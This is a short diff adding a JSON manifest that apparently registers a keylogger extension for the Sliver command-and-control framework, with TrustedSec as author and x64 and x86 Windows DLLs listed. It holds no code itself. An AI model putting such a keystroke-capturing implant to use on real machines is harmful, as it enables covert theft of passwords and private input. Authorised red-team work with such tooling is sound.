@@ -1,0 +1,22 @@
+{
+    "name": "raw_keylogger",
+    "version": "0.0.0",
+    "command_name": "raw_keylogger",
+    "extension_author": "TrustedSec",
+    "original_author": "TrustedSec",
+    "repo_url": "N/A",
+    "help": "Logs keystrokes using the raw input interface",
+    "entrypoint": "entrypoint",
+    "files": [
+    {
+    "os": "windows",
+    "arch": "amd64",
+    "path": "SliverKeylogger.x64.dll"
+    },
+    {
+    "os": "windows",
+    "arch": "386",
+    "path": "SliverKeylogger.x86.dll"
+    }
+    ]
+    }
